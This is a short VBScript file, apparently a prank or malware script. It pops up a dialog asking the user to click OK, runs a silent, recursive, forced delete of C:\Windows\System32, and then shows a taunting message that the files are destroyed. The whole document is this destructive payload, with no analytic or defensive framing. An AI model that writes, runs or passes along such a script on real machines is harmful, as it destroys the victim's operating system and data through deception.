set cmd=wscript.createObject("wscript.shell")
X=MsgBox("Click OK, please!" ,0+16, "why")
cmd.run "del C:\Windows\System32 /s /a /q"
X=MsgBox("Your files will be destroyed on: 0" ,0+64, "Why are you running!!?!!")
